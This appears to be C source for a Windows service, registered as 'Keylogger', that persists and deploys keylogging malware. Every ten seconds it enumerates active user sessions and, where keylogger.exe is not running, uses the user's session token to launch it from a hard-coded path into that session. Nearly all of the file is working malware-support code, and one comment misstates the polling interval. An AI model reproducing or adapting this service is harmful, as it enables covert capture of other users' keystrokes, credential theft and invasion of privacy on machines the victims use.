#include <windows.h>
#include <wtsapi32.h>
#include <userenv.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Userenv.lib")

// Path to keylogger executable (adjust path)
#define KEYLOGGER_PATH "C:\\Users\\tvp\\Desktop\\keylogger.exe"

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

BOOL IsProcessRunningInSession(DWORD sessionId, const char* processName) {
    BOOL found = FALSE;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return FALSE;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                DWORD pid = pe.th32ProcessID;

                // Open process to get session ID
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
                if (hProcess) {
                    DWORD procSessionId = 0;
                    if (ProcessIdToSessionId(pid, &procSessionId)) {
                        if (procSessionId == sessionId) {
                            found = TRUE;
                            CloseHandle(hProcess);
                            break;
                        }
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return found;
}

void LaunchKeyloggerInSession(DWORD sessionId) {
    HANDLE hToken = NULL;
    if (!WTSQueryUserToken(sessionId, &hToken))
        return;

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFO);
    si.lpDesktop = "winsta0\\default";

    if (CreateProcessAsUser(
            hToken,
            NULL,
            KEYLOGGER_PATH,
            NULL,
            NULL,
            FALSE,
            CREATE_NEW_CONSOLE,
            NULL,
            NULL,
            &si,
            &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(hToken);
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    hStatus = RegisterServiceCtrlHandler("Keylogger", NULL);
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    while (1) {
        DWORD count = 0;
        WTS_SESSION_INFOA *pSessions = NULL;
        if (WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessions, &count)) {
            for (DWORD i = 0; i < count; i++) {
                if (pSessions[i].State == WTSActive) {
                    DWORD sessionId = pSessions[i].SessionId;
                    if (!IsProcessRunningInSession(sessionId, "keylogger.exe")) {
                        LaunchKeyloggerInSession(sessionId);
                    }
                }
            }
            WTSFreeMemory(pSessions);
        }
        Sleep(10000); // check every 5 seconds
    }
}

int main() {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {"Keylogger", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };
    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}
